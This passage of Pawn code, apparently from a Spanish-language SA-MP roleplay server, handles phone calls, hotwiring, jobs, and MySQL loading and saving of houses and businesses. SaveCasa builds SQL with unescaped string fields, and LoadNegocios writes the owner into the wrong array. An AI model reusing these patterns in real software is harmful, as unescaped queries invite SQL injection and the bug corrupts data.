                if(EnLlamada[x] != 0 || PersonaEnLlamada[x] != NOEXISTE){tlfencontrado = -1; break;}
                tlfencontrado = 1;
                format(string, sizeof(string), "* El teléfono de %s empieza a sonar.", GetPlayerNameRP(x));
    			ProxDetector(15.0, x, string, Morado,Morado,Morado,Morado,Morado);
    			format(string, sizeof(string), "* Llamada entrante del %d.", PlayerInfo[playerid][pTelefono]);
    			SendClientMessage(x, Naranja, string);
    			SendClientMessage(x, Naranja, "* Utiliza '/Contestar' para responder al teléfono.");

    			format(string, sizeof(string), "Llamando al %d.", numero);
    			SendClientMessage(playerid, Gris, string);
				ToqueLlamada[x] = 0;
				PersonaEnLlamada[playerid] = x;
				PersonaEnLlamada[x] = playerid;
				EnLlamada[playerid] = 1;
				ToqueLlamadaTimer[x] = SetTimerEx("DarToqueLlamada", 5000, true, "i", x);
                break;
            }
        }
    }

    if(tlfencontrado == -1){SendClientMessage(playerid, Gris, "El número que ha marcado ya está en una llamada."); return 1;}
    if(tlfencontrado == 0){SendClientMessage(playerid, Gris, "El número que ha marcado no existe o no está disponible."); return 1;}
    return 1;
}

stock ColgarTelefono(playerid)
{
	new string[128];
	new oyente = PersonaEnLlamada[playerid];
    if(EnLlamada[playerid] == 1) //Está llamando a alguien
	{
	    EnLlamada[playerid] = 0;
	    SendClientMessage(playerid, Gris, "Has colgado");
	    format(string, sizeof(string), "Tienes una llamada perdida del %d.", PlayerInfo[playerid][pTelefono]);
		SendClientMessage(oyente, Gris, string);
		KillTimer(ToqueLlamadaTimer[oyente]);
		ToqueLlamada[oyente] = 0;
		PersonaEnLlamada[oyente] = NOEXISTE;
	    PersonaEnLlamada[playerid] = NOEXISTE;
	    return 1;
	}
	if(EnLlamada[playerid] == 2 || EnLlamada[playerid] == 3) //Llamada normal
	{
	    SendClientMessage(playerid, Gris, "Has colgado");
		SendClientMessage(oyente, Gris, "Han colgado.");
	    if(EnLlamada[playerid] == 3)
		{
			KillTimer(CostoLlamadaTimer[playerid]);
			format(string, sizeof(string), "Coste de la llamada: %d$", CosteTotalLlamada[playerid]);
			SendClientMessage(playerid, RojoIntenso, string);
			PlayerInfo[playerid][pDineroBanco] -= CosteTotalLlamada[playerid];
			CosteTotalLlamada[oyente] = 0;
		}
	    if(EnLlamada[oyente] == 3)
		{
			KillTimer(CostoLlamadaTimer[oyente]);
			format(string, sizeof(string), "Coste de la llamada: %d$", CosteTotalLlamada[oyente]);
			SendClientMessage(oyente, RojoIntenso, string);
			PlayerInfo[oyente][pDineroBanco] -= CosteTotalLlamada[oyente];
			CosteTotalLlamada[oyente] = 0;
		}
		EnLlamada[playerid] = 0;
	    EnLlamada[oyente] = 0;
	    PersonaEnLlamada[oyente] = NOEXISTE;
	    PersonaEnLlamada[playerid] = NOEXISTE;
		return 1;
	}
	if(EnLlamada[playerid] == 444) //Anuncios
	{
	    EnLlamada[playerid] = 0;
		SendClientMessage(playerid, Gris, "Has colgado");
	}
	if(EnLlamada[playerid] == 911) //Llamando a emergencias
	{
		EnLlamada[playerid] = 0;
		SendClientMessage(playerid, Gris, "Has colgado");
	}
	if(EnLlamada[playerid] == 912) //Llamada de emergencias
	{
	    SendClientMessage(playerid, Gris, "Has colgado");
		SendClientMessage(oyente, Gris, "Han colgado.");
		EnLlamada[playerid] = 0;
	    EnLlamada[oyente] = 0;
	    PersonaEnLlamada[oyente] = NOEXISTE;
	    PersonaEnLlamada[playerid] = NOEXISTE;
	}
	return 1;
}

forward DarToqueLlamada(playerid);
public DarToqueLlamada(playerid)
{
	new string[128];
	if(!PlayerTieneObjeto(playerid, 68))
	{
		EnLlamada[PersonaEnLlamada[playerid]] = 0;
		ToqueLlamada[playerid] = 0;
		SendClientMessage(PersonaEnLlamada[playerid], Gris, "No contestan.");
		PersonaEnLlamada[PersonaEnLlamada[playerid]] = NOEXISTE;
		PersonaEnLlamada[playerid] = NOEXISTE;
		KillTimer(ToqueLlamadaTimer[playerid]);
		return 1;
	}
	if(ToqueLlamada[playerid] > 5)
	{
	    EnLlamada[PersonaEnLlamada[playerid]] = 0;
		ToqueLlamada[playerid] = 0;
		format(string, sizeof(string), "Llamada perdida del %d.", PlayerInfo[PersonaEnLlamada[playerid]][pTelefono]);
		SendClientMessage(playerid, Gris, string);
		SendClientMessage(PersonaEnLlamada[playerid], Gris, "No contestan.");
		for(new i=0; i<MAX_PLAYERS; i++)
		{
		    if(PersonaEnLlamada[i] == playerid){PersonaEnLlamada[i] = NOEXISTE; break;}
		}
		PersonaEnLlamada[playerid] = NOEXISTE;
		KillTimer(ToqueLlamadaTimer[playerid]);
		return 1;
	}
	format(string, sizeof(string), "* El teléfono de %s suena.", GetPlayerNameRP(playerid));
    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	SendClientMessage(PersonaEnLlamada[playerid], Gris, "Llamando...");
	ToqueLlamada[playerid] ++;
	return 1;
}

stock EstaEnMostrador(playerid)
{
	new mostrador;
	for(new x=0; x<sizeof(Mostradores); x++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, Mostradores[x][0], Mostradores[x][1], Mostradores[x][2])){mostrador = x; break;}
	}
	return mostrador;
}

forward PuentearF(playerid, coche);
public PuentearF(playerid, coche)
{
	new string[128];
	PuenteHecho[playerid] = 5;
	TogglePlayerControllable(playerid, 1);
	new rand;
    rand = random(10);
    if(rand > 2+(PlayerInfo[playerid][pHabLad]/30))
	{
		format(string, sizeof(string), "* %s intenta hacer un puente a un vehículo pero no lo logra.", GetPlayerNameRP(playerid));
    	ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
    	Puenteando[playerid] = 0;
    	return 1;
    }
 	format(string, sizeof(string), "* %s hace un puente a un vehículo.", GetPlayerNameRP(playerid));
    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
    new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(coche,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(coche,1,lights,alarm,doors,bonnet,boot,objective);
	Puenteando[playerid] = 0;
	return 1;
}

forward RobarF(playerid, tipo);
public RobarF(playerid, tipo)
{
	new string[128];
	TogglePlayerControllable(playerid, 1);
	if(tipo == 1) //Casa
	{
		new rand = random(300+PlayerInfo[playerid][pHabLad]*2);
		new dinero = 100+rand;
		GivePlayerMoneyAC(playerid, dinero);
		format(string, sizeof(string), "Has encontrado %d$ en efectivo.", dinero);
		SendClientMessage(playerid, Verde, string);
		Robando[playerid] = 0;
		PlayerInfo[playerid][pTiempoRobo] = 12;
		PlayerInfo[playerid][pHabLad] ++;
	}
	if(tipo == 2) //Negocio
	{
	    new rand = random(400+PlayerInfo[playerid][pHabLad]*2);
		new dinero = 250+rand;
		GivePlayerMoneyAC(playerid, dinero);
		format(string, sizeof(string), "Has encontrado %d$ en efectivo.", dinero);
		SendClientMessage(playerid, Verde, string);
		Robando[playerid] = 0;
		PlayerInfo[playerid][pTiempoRobo] = 25;
		PlayerInfo[playerid][pHabLad] ++;
	}
	return 1;
}

forward AlarmaCoche(coche);
public AlarmaCoche(coche)
{
    new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(coche,engine,lights,alarm,doors,bonnet,boot,objective);
    SetVehicleParamsEx(coche,engine,lights,0,doors,bonnet,boot,objective);
}

stock PlayerTieneObjeto(playerid, objetoid)
{
	for(new x=0; x<8; x++)
	{
	    if(PlayerInfo[playerid][pBol][x] == objetoid){return x+1;}
	}
	if(PlayerInfo[playerid][pManoDer] == objetoid){return 9;}
	if(PlayerInfo[playerid][pManoIzq] == objetoid){return 10;}
	return 0;
}

stock LinkVehicleToInteriorEx(vehicleid, interior)
{
    LinkVehicleToInterior(vehicleid, interior);
    CarInfo[vehicleid][cInterior] = interior;
    return 1;
}

stock EncenderMotorF(playerid, car)
{
    new engine,lights,alarm,doors,bonnet,boot,objective,Float:cvida,string[128];
    GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
    if(engine == 1) //Si está encendido apagar
	{
 		format(string, sizeof(string), "* %s apaga el motor de su vehículo.", GetPlayerNameRP(playerid));
   		ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
   		SetVehicleParamsEx(car,0,lights,alarm,doors,bonnet,boot,objective);
   		return 1;
    }
    else //Si está apagado encender
	{
	    GetVehicleHealth(car, cvida);
	    if(cvida < MIN_CAR_HEALTH){SendClientMessage(playerid, Rojo, "* El motor está demasiado dañado."); return 1;}
		if(EncendiendoMotor[playerid] == 0)
		{
	        if(car <= MAX_VEHPUBLICO)
		    {
		    	if(!PlayerEsFaccionVeh(playerid, car)){return 1;}
				format(string, sizeof(string), "* %s mete la llave en el contacto y lo gira.", GetPlayerNameRP(playerid));
   				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		        SetTimerEx("EncenderMotor", 2000, false, "i", playerid);
		        EncendiendoMotor[playerid] = 1;
	        }
	        else if(car > MAX_VEHPUBLICO)
	        {
	            if(!PlayerTieneLlaveVeh(playerid, car)){SendClientMessage(playerid, Rojo, "* No tienes las llaves de este vehículo."); return 1;}
	            if(CarInfo[car][cGas] <= 0){SendClientMessage(playerid, Rojo, "* No queda combustible."); return 1;}
				format(string, sizeof(string), "* %s mete la llave en el contacto y lo gira.", GetPlayerNameRP(playerid));
   				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		        SetTimerEx("EncenderMotor", 2000, false, "i", playerid);
		        EncendiendoMotor[playerid] = 1;
	        }
	    }
	}
	return 1;
}

forward RepintarMeca(playerid, color1, color2, coche); //Repintar
public RepintarMeca(playerid, color1, color2, coche)
{
    TogglePlayerControllable(playerid, 1);
	ChangeVehicleColor(coche, color1, color2);
	CarInfo[coche][cColor1] = color1;
	CarInfo[coche][cColor2] = color2;
	GameTextForPlayer(playerid, "~g~Vehiculo repintado", 3000, 3);
	return 1;
}

forward RepararMeca(playerid, tipo, coche); //Reparar
public RepararMeca(playerid, tipo, coche)
{
    TogglePlayerControllable(playerid, 1);
	if(tipo == 1) //Motor
	{
	    SiendoReparado[playerid] = 0;
		SetVehicleHealth(coche, 1000);
		GameTextForPlayer(playerid, "~g~Motor reparado", 3000, 3);
		return 1;
	}
	if(tipo == 2) //Carrocería
	{
	    SiendoReparado[playerid] = 0;
	    new Float:cvida;
	    GetVehicleHealth(coche, cvida);
	    new panels,doors,lights,tires,tires2;
		GetVehicleDamageStatus(coche,panels,doors,lights,tires);
		RepairVehicle(coche);
		SetVehicleHealth(coche, cvida);
		GetVehicleDamageStatus(coche,panels,doors,lights,tires2);
		if(tires != 0)
		{
			tires = encode_tires(1, 1, 1, 1);
		  	UpdateVehicleDamageStatus(coche, panels, doors, lights, tires);
		}
		GameTextForPlayer(playerid, "~g~Carroceria reparada", 3000, 3);
		return 1;
	}
	if(tipo == 3) //Ruedas
	{
	    SiendoReparado[playerid] = 0;
	    new panels,doors,lights,tires;
		GetVehicleDamageStatus(coche,panels,doors,lights,tires);
		tires = encode_tires(0, 0, 0, 0);
	  	UpdateVehicleDamageStatus(coche, panels, doors, lights, tires);
		GameTextForPlayer(playerid, "~g~Ruedas reparadas", 3000, 3);
	}
	if(tipo == 4) //Todo
	{
		SiendoReparado[playerid] = 0;
	    RepairVehicle(coche);
	    GameTextForPlayer(playerid, "~g~Vehiculo reparado", 3000, 3);
	    GivePlayerMoney(playerid, -400);
	}
	return 1;
}

stock GetPlayerTaller(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 30.0, 2527.2297,-2089.9980,13.5469) || IsPlayerInRangeOfPoint(playerid, 30.0, 1909.7643,-1869.6307,13.5647)) return 1;
	if(NegoInfo[GetPlayerDentroNego(playerid)][nTipo] == 6) return GetPlayerDentroNego(playerid);
	return 0;
}

forward Pescar(playerid); //Job pescador
public Pescar(playerid)
{
    new string[128];
	TogglePlayerControllable(playerid, 1);
	if(Trabajando[playerid] == 1 && PlayerInfo[playerid][pTrabajo] == 9)
	{
	    if(PescaRecogida[playerid] < 11)
	  	{
 	    	new pescarand = random(80);
 	    	new valorpesca = pescarand+20;
 	    	format(string, sizeof(string), "Has pescado una red valorada en %d$.", valorpesca);
 	    	SendClientMessage(playerid, Verde, string);
 	    	DineroPesca[playerid] += valorpesca;
 	    	new rand = random(sizeof(ChecksPescador));
 	    	SetPlayerCheckpoint(playerid, ChecksPescador[rand][0], ChecksPescador[rand][1], ChecksPescador[rand][2], 5.0);
 	    	PescaRecogida[playerid] ++;
 	    	return 1;
 	    }
 	    if(PescaRecogida[playerid] == 11)
 	    {
 	        new pescarand = random(80);
 	    	new valorpesca = pescarand+20;
 	    	format(string, sizeof(string), "Has pescado una red valorada en %d$.", valorpesca);
 	    	SendClientMessage(playerid, Verde, string);
 	    	DineroPesca[playerid] += valorpesca;
 	    	SendClientMessage(playerid, Verde, "Ya has pescado suficiente. Vuelve al puerto para recibir tu paga.");
 	        SetPlayerCheckpoint(playerid, 2983.2764,-1526.3475,0.0000, 5.0);
 	        PescaRecogida[playerid] ++;
 	        return 1;
 	    }
	}
	return 1;
}

forward ReponerCajero(playerid); //Job securicar
public ReponerCajero(playerid)
{
	TogglePlayerControllable(playerid, 1);
	if(Trabajando[playerid] == 1 && PlayerInfo[playerid][pTrabajo] == 3)
	{
	    if(CajeroRepuesto[playerid] < 7)
 	    {
 	        SendClientMessage(playerid, Verde, "Ve al siguiente cajero.");
 	    	new rand = random(sizeof(Cajeros));
 	    	SetPlayerCheckpoint(playerid, Cajeros[rand][cX], Cajeros[rand][cY], Cajeros[rand][cZ], 5.0);
 	    	CajeroRepuesto[playerid] ++;
 	    	return 1;
 	    }
 	    if(CajeroRepuesto[playerid] == 7)
 	    {
 	        SendClientMessage(playerid, Verde, "Ya has repuesto suficientes cajeros. Vuelve para recibir tu paga.");
 	        SetPlayerCheckpoint(playerid, 596.1353,-1287.5891,15.6741, 5.0);
 	        CajeroRepuesto[playerid] ++;
 	        return 1;
 	    }
	}
	return 1;
}

forward TimerDejarTrabajarF(playerid);
public TimerDejarTrabajarF(playerid)
{
	if(Trabajando[playerid] == 1) //Trabajando
	{
	    if(PlayerInfo[playerid][pTrabajo] == 1) //Pizzero
	    {
	        Trabajando[playerid] = 0;
	        PizzaRepartida[playerid] = 0;
	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	        DisablePlayerCheckpoint(playerid);
	        SendClientMessage(playerid, Rojo, "* Has dejado de repartir pizzas.");
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 2) //Barrendero
	    {
	        Trabajando[playerid] = 0;
	        CalleBarrida[playerid] = 0;
	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	        DisablePlayerCheckpoint(playerid);
	        SendClientMessage(playerid, Rojo, "* Has dejado de barrer.");
	    }
     	if(PlayerInfo[playerid][pTrabajo] == 3) //Securicar
	    {
	        Trabajando[playerid] = 0;
	        CajeroRepuesto[playerid] = 0;
	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	        DisablePlayerCheckpoint(playerid);
	        SendClientMessage(playerid, Rojo, "* Has dejado de reponer cajeros.");
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 4) //Cosechador
	    {
	        Trabajando[playerid] = 0;
	        Cosechado[playerid] = 0;
	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	        DisablePlayerCheckpoint(playerid);
	        SendClientMessage(playerid, Rojo, "* Has dejado de cosechar.");
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 5) //Fumigador aéreo
	    {
	        Trabajando[playerid] = 0;
	        Fumigado[playerid] = 0;
	        SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	        DisablePlayerRaceCheckpoint(playerid);
			DisablePlayerCheckpoint(playerid);
	        SendClientMessage(playerid, Rojo, "* Has dejado de fumigar.");
	    }
	    if(PlayerInfo[playerid][pTrabajo] == 9) //Pescador
	    {
	        Trabajando[playerid] = 0;
	        PescaRecogida[playerid] = 0;
	        DisablePlayerCheckpoint(playerid);
	        SendClientMessage(playerid, Rojo, "* Has dejado de pescar.");
	    }
	}
	return 1;
}

stock GetPlayerDentroNego(playerid) //Consigue la ID del negocio en el que está el jugador
{
	new casa, Float:Sx, Float:Sy, Float:Sz, Int=GetPlayerInterior(playerid), VW=GetPlayerVirtualWorld(playerid);
    for(new x=1; x <= TotalNegs; x++)
	{
	    Sx = NegoInfo[x][nSalidaX], Sy = NegoInfo[x][nSalidaY], Sz = NegoInfo[x][nSalidaZ];
	    if(IsPlayerInRangeOfPoint(playerid, 50.0, Sx, Sy, Sz) && (Int == NegoInfo[x][nInterior]) && (VW == NegoInfo[x][nVirtualWorld]))
	    {
	        casa = x; break;
	    }
	}
	return casa;
}

stock GetPlayerDentroPuertaNego(playerid) //Consigue la ID del negocio en el que está el jugador puerta
{
	new casa, Float:Sx, Float:Sy, Float:Sz, Int=GetPlayerInterior(playerid), VW=GetPlayerVirtualWorld(playerid);
    for(new x=1; x <= TotalNegs; x++)
	{
	    Sx = NegoInfo[x][nSalidaX], Sy = NegoInfo[x][nSalidaY], Sz = NegoInfo[x][nSalidaZ];
	    if(IsPlayerInRangeOfPoint(playerid, 2.5, Sx, Sy, Sz) && (Int == NegoInfo[x][nInterior]) && (VW == NegoInfo[x][nVirtualWorld]))
	    {
	        casa = x; break;
	    }
	}
	return casa;
}

stock GetPlayerFueraPuertaNego(playerid) //Consigue la ID del negocio más cercano al jugador
{
	new casa, Float:Ex, Float:Ey, Float:Ez;
    for(new x=1; x <= TotalNegs; x++)
	{
	    Ex = NegoInfo[x][nEntradaX], Ey = NegoInfo[x][nEntradaY], Ez = NegoInfo[x][nEntradaZ];
	    if(IsPlayerInRangeOfPoint(playerid, 1.0, Ex, Ey, Ez))
	    {
	        casa = x; break;
	    }
	}
	return casa;
}

UpdateNegocioLabel(n) //Actualiza 3DTextLabels negocios
{
    new string[250];
	if(NegoInfo[n][nComprado] == 0) //negocio libre
	{
		format(string,sizeof(string)," %s\nEn venta\nPrecio: %d$",NegoInfo[n][nNombre],NegoInfo[n][nValor]);
	}
	else if(NegoInfo[n][nComprado] == 1) //negocio comprado
	{
		format(string,sizeof(string),"%s",NegoInfo[n][nNombre]);
	}
	if(NegoInfo[n][nCerrado] == 0)UpdateDynamic3DTextLabelText(NegoInfo[n][nPickup],Aguamarina,string);
	else UpdateDynamic3DTextLabelText(NegoInfo[n][nPickup],AguamarinaOscuro,string);
}

stock GetPlayerDentroCasa(playerid) //Consigue la ID de la casa en la que está el jugador
{
	new casa, Float:Sx, Float:Sy, Float:Sz, Int=GetPlayerInterior(playerid), VW=GetPlayerVirtualWorld(playerid);
    for(new x=1; x <= TotalCasas; x++)
	{
	    Sx = HouseInfo[x][hSalidaX], Sy = HouseInfo[x][hSalidaY], Sz = HouseInfo[x][hSalidaZ];
	    if(IsPlayerInRangeOfPoint(playerid, 50.0, Sx, Sy, Sz) && (Int == HouseInfo[x][hInterior]) && (VW == HouseInfo[x][hVirtualWorld]))
	    {
	        casa = x; break;
	    }
	}
	return casa;
}

stock GetPlayerDentroPuertaCasa(playerid) //Consigue la ID de la casa en la que está el jugador puerta
{
	new casa, Float:Sx, Float:Sy, Float:Sz, Int=GetPlayerInterior(playerid), VW=GetPlayerVirtualWorld(playerid);
    for(new x=1; x <= TotalCasas; x++)
	{
	    Sx = HouseInfo[x][hSalidaX], Sy = HouseInfo[x][hSalidaY], Sz = HouseInfo[x][hSalidaZ];
	    if(IsPlayerInRangeOfPoint(playerid, 2.0, Sx, Sy, Sz) && (Int == HouseInfo[x][hInterior]) && (VW == HouseInfo[x][hVirtualWorld]))
	    {
	        casa = x; break;
	    }
	}
	return casa;
}

stock GetPlayerFueraPuertaCasa(playerid) //Consigue la ID de la casa más cercana al jugador
{
	new casa, Float:Ex, Float:Ey, Float:Ez;
    for(new x=1; x <= TotalCasas; x++)
	{
	    Ex = HouseInfo[x][hEntradaX], Ey = HouseInfo[x][hEntradaY], Ez = HouseInfo[x][hEntradaZ];
	    if(IsPlayerInRangeOfPoint(playerid, 1.0, Ex, Ey, Ez))
	    {
	        casa = x; break;
	    }
	}
	return casa;
}

UpdateHouseLabel(h) //Actualiza 3DTextLabels casas
{
	new string[250];
	if(HouseInfo[h][hComprada] == -1) //hotel
	{
		format(string,sizeof(string),"%s\nPrecio de alquiler: %d$",HouseInfo[h][hBarrio],HouseInfo[h][hPAlquiler]);
		if(HouseInfo[h][hInquilinos] >0) strcat(string,"\nOcupada");
		else strcat(string,"\nLibre");
	}
	else if(HouseInfo[h][hComprada] == 0) //casa libre
	{
		format(string,sizeof(string),"%s\nEstado: En venta\nPrecio: %d$",HouseInfo[h][hBarrio],HouseInfo[h][hValor]);
	}
	else if(HouseInfo[h][hComprada] == 1 && HouseInfo[h][hAlquilable] == 0) //casa comprada y no alquilable
	{
		format(string,sizeof(string),"%s\nEstado: Comprada",HouseInfo[h][hBarrio]);
	}
	else if(HouseInfo[h][hComprada] == 1 && HouseInfo[h][hAlquilable] == 1) //casa comprada y alquilable
	{
		format(string,sizeof(string),"%s\nEstado: Ocupado\nInquilinos: %d\nPrecio de alquiler: %d$",HouseInfo[h][hBarrio],HouseInfo[h][hInquilinos],HouseInfo[h][hPAlquiler]);
	}
	if(HouseInfo[h][hCerrada] == 0)UpdateDynamic3DTextLabelText(HouseInfo[h][hPickup],VerdeClaro,string);
	else UpdateDynamic3DTextLabelText(HouseInfo[h][hPickup],Verde,string);
}

LoadCasas() //Cargar casas
{
    new Query[180], content[60], armario[10], armariocant[20];
	new ccount;
	new sql[80], row[512];
	format(sql, sizeof(sql), "SELECT ID FROM casas ORDER BY ID DESC");
	mysql_query(1, sql);
	mysql_store_result();
	mysql_fetch_row(row);
	ccount = strval(row);

	for(new x=1; x<=ccount; x++)
	{
	    mysql_format(1, Query, sizeof(Query), "SELECT * FROM `casas` WHERE `ID` = %d", x);
		mysql_query(1, Query);
		mysql_store_result();
		if(cache_get_field_content_float(0, "EntradaX") != 0.0)
		{
			HouseInfo[x][hSQLID] = cache_get_field_content_int(0, "ID");
		 	HouseInfo[x][hEntradaX] = cache_get_field_content_float(0, "EntradaX");
		 	HouseInfo[x][hEntradaY] = cache_get_field_content_float(0, "EntradaY");
		 	HouseInfo[x][hEntradaZ] = cache_get_field_content_float(0, "EntradaZ");
		 	HouseInfo[x][hSalidaX] = cache_get_field_content_float(0, "SalidaX");
		 	HouseInfo[x][hSalidaY] = cache_get_field_content_float(0, "SalidaY");
		 	HouseInfo[x][hSalidaZ] = cache_get_field_content_float(0, "SalidaZ");
		 	
		 	cache_get_field_content(0, "Barrio", content);
		    format(HouseInfo[x][hBarrio], 60, "%s", content);
		    
		    HouseInfo[x][hVirtualWorld] = cache_get_field_content_int(0, "VirtualWorld");
		    HouseInfo[x][hInterior] = cache_get_field_content_int(0, "Interior");
		    HouseInfo[x][hVirtualWorld2] = cache_get_field_content_int(0, "VirtualWorld2");
		    HouseInfo[x][hInterior2] = cache_get_field_content_int(0, "Interior2");
		    HouseInfo[x][hValor] = cache_get_field_content_int(0, "Valor");
		    HouseInfo[x][hComprada] = cache_get_field_content_int(0, "Comprada");
		    
		    cache_get_field_content(0, "Dueno", content);
		    format(HouseInfo[x][hDueno], 60, "%s", content);
		    
		    HouseInfo[x][hCerrada] = cache_get_field_content_int(0, "Cerrada");
		    HouseInfo[x][hAlquilable] = cache_get_field_content_int(0, "Alquilable");
		    HouseInfo[x][hPAlquiler] = cache_get_field_content_int(0, "PAlquiler");
		    HouseInfo[x][hInquilinos] = cache_get_field_content_int(0, "Inquilinos");
		    for(new a=0; a<10; a++)
		    {
		        format(armario, sizeof(armario), "Armario%d", a+1);
		        format(armariocant, sizeof(armariocant), "ArmarioCant%d", a+1);
		        HouseInfo[x][hArmario][a] = cache_get_field_content_int(0, armario);
		    	HouseInfo[x][hArmarioCant][a] = cache_get_field_content_int(0, armariocant);
		    }
		    HouseInfo[x][hDineroGuardado] = cache_get_field_content_int(0, "DineroGuardado");
			if(TotalCasas < x) TotalCasas = x;
        }
	}

    printf("Casas cargadas: %d (MAX: %d)",TotalCasas,MAX_HOUSES);
	return 1;
}

SaveCasa(idx) //Guardar casas
{
	if(strlen(HouseInfo[idx][hBarrio]))
	{
	    new sql[1024];
	    format(sql, sizeof(sql), "UPDATE casas SET EntradaX=%f,EntradaY=%f,EntradaZ=%f,SalidaX=%f,SalidaY=%f,SalidaZ=%f,Barrio='%s',VirtualWorld=%d,Interior=%d,VirtualWorld2=%d,Interior2=%d,Valor=%d,Comprada=%d,Dueno='%s',Alquilable=%d,PAlquiler=%d,Inquilinos=%d WHERE ID=%d",
		HouseInfo[idx][hEntradaX], //Pos x de entrada
		HouseInfo[idx][hEntradaY], //Pos y de entrada
		HouseInfo[idx][hEntradaZ], //Pos z de entrada
		HouseInfo[idx][hSalidaX], //Pos x de salida
		HouseInfo[idx][hSalidaY], //Pos y de salida
		HouseInfo[idx][hSalidaZ], //Pos z de salida
		HouseInfo[idx][hBarrio], //Nombre del barrio
		HouseInfo[idx][hVirtualWorld], //VW de la casa
		HouseInfo[idx][hInterior], //Int de la casa
		HouseInfo[idx][hVirtualWorld2], //VW de salida
		HouseInfo[idx][hInterior2], //Int de salida
		HouseInfo[idx][hValor], //Precio de la casa
		HouseInfo[idx][hComprada], //Si está comprada
		HouseInfo[idx][hDueno], //Nombre del dueño
		HouseInfo[idx][hAlquilable], //Si está alquilable
		HouseInfo[idx][hPAlquiler], //Precio de alquiler
		HouseInfo[idx][hInquilinos], //Personas residentes en la casa
		HouseInfo[idx][hSQLID]); //ID en base de datos
		mysql_query(1, sql);
		
		for(new x=0; x<10; x++)
		{
		    format(sql, sizeof(sql), "UPDATE casas SET Armario%d=%d,ArmarioCant%d=%d WHERE ID=%d",
		    x+1, HouseInfo[idx][hArmario][x], x+1, HouseInfo[idx][hArmarioCant][x],
			HouseInfo[idx][hSQLID]);
			mysql_query(1, sql);
		}
		
		format(sql, sizeof(sql), "UPDATE casas SET DineroGuardado=%d WHERE ID=%d",
		HouseInfo[idx][hDineroGuardado], HouseInfo[idx][hSQLID]);
		mysql_query(1, sql);
	}
	return 1;
}

LoadNegocios() //Cargar negocios
{
    new Query[180], content[60], almacen[10], almacencant[20];
	new ccount;
	new sql[80], row[512];
	format(sql, sizeof(sql), "SELECT ID FROM negocios ORDER BY ID DESC");
	mysql_query(1, sql);
	mysql_store_result();
	mysql_fetch_row(row);
	ccount = strval(row);

	for(new x=1; x<=ccount; x++)
	{
	    mysql_format(1, Query, sizeof(Query), "SELECT * FROM `negocios` WHERE `ID` = %d", x);
		mysql_query(1, Query);
		mysql_store_result();
		if(cache_get_field_content_float(0, "EntradaX") != 0.0)
		{
			NegoInfo[x][nSQLID] = cache_get_field_content_int(0, "ID");
		 	NegoInfo[x][nEntradaX] = cache_get_field_content_float(0, "EntradaX");
		 	NegoInfo[x][nEntradaY] = cache_get_field_content_float(0, "EntradaY");
		 	NegoInfo[x][nEntradaZ] = cache_get_field_content_float(0, "EntradaZ");
		 	NegoInfo[x][nSalidaX] = cache_get_field_content_float(0, "SalidaX");
		 	NegoInfo[x][nSalidaY] = cache_get_field_content_float(0, "SalidaY");
		 	NegoInfo[x][nSalidaZ] = cache_get_field_content_float(0, "SalidaZ");

		 	cache_get_field_content(0, "Nombre", content);
		    format(NegoInfo[x][nNombre], 60, "%s", content);

            NegoInfo[x][nTipo] = cache_get_field_content_int(0, "Tipo");
		    NegoInfo[x][nVirtualWorld] = cache_get_field_content_int(0, "VirtualWorld");
		    NegoInfo[x][nInterior] = cache_get_field_content_int(0, "Interior");
		    NegoInfo[x][nVirtualWorld2] = cache_get_field_content_int(0, "VirtualWorld2");
		    NegoInfo[x][nInterior2] = cache_get_field_content_int(0, "Interior2");
		    NegoInfo[x][nValor] = cache_get_field_content_int(0, "Valor");
		    NegoInfo[x][nComprado] = cache_get_field_content_int(0, "Comprado");

		    cache_get_field_content(0, "Dueno", content);
		    format(HouseInfo[x][hDueno], 60, "%s", content);

		    NegoInfo[x][nCerrado] = cache_get_field_content_int(0, "Cerrado");
		    NegoInfo[x][nDineroGuardado] = cache_get_field_content_int(0, "DineroGuardado");
		    NegoInfo[x][nProd] = cache_get_field_content_int(0, "Prod");
		    NegoInfo[x][nMaxAlmacen] = cache_get_field_content_int(0, "MaxAlmacen");
		    
		    for(new a=0; a<NegoInfo[x][nMaxAlmacen]; a++)
		    {
		        format(almacen, sizeof(almacen), "Almacen%d", a+1);
		        format(almacencant, sizeof(almacencant), "AlmacenCant%d", a+1);
		        NegoInfo[x][nAlmacen][a] = cache_get_field_content_int(0, almacen);
		    	NegoInfo[x][nAlmacenCant][a] = cache_get_field_content_int(0, almacencant);
		    }
		    
		    NegoInfo[x][nTallerEX] = cache_get_field_content_float(0, "TallerEX");
			NegoInfo[x][nTallerEY] = cache_get_field_content_float(0, "TallerEY");
			NegoInfo[x][nTallerEZ] = cache_get_field_content_float(0, "TallerEZ");
			NegoInfo[x][nTallerERotZ] = cache_get_field_content_float(0, "TallerERotZ");
			NegoInfo[x][nTallerSX] = cache_get_field_content_float(0, "TallerSX");
			NegoInfo[x][nTallerSY] = cache_get_field_content_float(0, "TallerSY");
			NegoInfo[x][nTallerSZ] = cache_get_field_content_float(0, "TallerSZ");
			NegoInfo[x][nTallerSRotZ] = cache_get_field_content_float(0, "TallerSRotZ");

			if(TotalNegs < x) TotalNegs = x;
        }
	}

    printf("Negocios cargados: %d (MAX: %d)",TotalNegs,MAX_NEGS);
	return 1;
}

SaveNegocios(idx) //Guardar negocios
{
	if(strlen(NegoInfo[idx][nNombre]))
	{
	    new sql[1024];
